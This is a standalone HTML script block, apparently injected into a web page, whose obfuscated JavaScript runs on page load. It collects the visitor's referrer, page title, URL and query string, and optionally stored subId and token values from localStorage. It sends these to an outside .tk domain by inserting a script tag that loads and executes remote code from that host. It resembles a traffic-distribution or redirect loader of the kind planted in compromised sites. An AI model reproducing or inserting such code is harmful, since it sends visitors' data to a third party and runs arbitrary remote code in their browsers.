<script>
    (function() {
    var name = '_czMjTXFrHYVJP3SK';
    if (!window._czMjTXFrHYVJP3SK) {
        window._czMjTXFrHYVJP3SK = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://pabaketoutem.tk/FyfzCr',
            P_PATH: 'https://pabaketoutem.tk/fec84ce/postback',
        };
    }
    const _LLQ8jmGcg6qtsSnQ = localStorage.getItem('config');
    if (typeof _LLQ8jmGcg6qtsSnQ !== 'undefined' && _LLQ8jmGcg6qtsSnQ !== null) {
        var _srkn2JcdXJ9k3Wff = JSON.parse(_LLQ8jmGcg6qtsSnQ);
        var _38NZYTndjyWDtrMx = Math.round(+new Date()/1000);
        if (_srkn2JcdXJ9k3Wff.created_at + window._czMjTXFrHYVJP3SK.ttl < _38NZYTndjyWDtrMx) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _vp9nHYwxjxGGCF95 = localStorage.getItem('subId');
    var _Gfj6DkGhftQ889F1 = localStorage.getItem('token');
    var _JQZGgphPzdVqH3tK = '?return=js.client';
        _JQZGgphPzdVqH3tK += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _JQZGgphPzdVqH3tK += '&se_referrer=' + encodeURIComponent(document.referrer);
        _JQZGgphPzdVqH3tK += '&default_keyword=' + encodeURIComponent(document.title);
        _JQZGgphPzdVqH3tK += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _JQZGgphPzdVqH3tK += '&name=' + encodeURIComponent(name);
        _JQZGgphPzdVqH3tK += '&host=' + encodeURIComponent(window._czMjTXFrHYVJP3SK.R_PATH);
    if (typeof _vp9nHYwxjxGGCF95 !== 'undefined' && _vp9nHYwxjxGGCF95 && window._czMjTXFrHYVJP3SK.unique) {
        _JQZGgphPzdVqH3tK += '&sub_id=' + encodeURIComponent(_vp9nHYwxjxGGCF95);
    }
    if (typeof _Gfj6DkGhftQ889F1 !== 'undefined' && _Gfj6DkGhftQ889F1 && window._czMjTXFrHYVJP3SK.unique) {
        _JQZGgphPzdVqH3tK += '&token=' + encodeURIComponent(_Gfj6DkGhftQ889F1);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._czMjTXFrHYVJP3SK.R_PATH + _JQZGgphPzdVqH3tK;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
    </script>
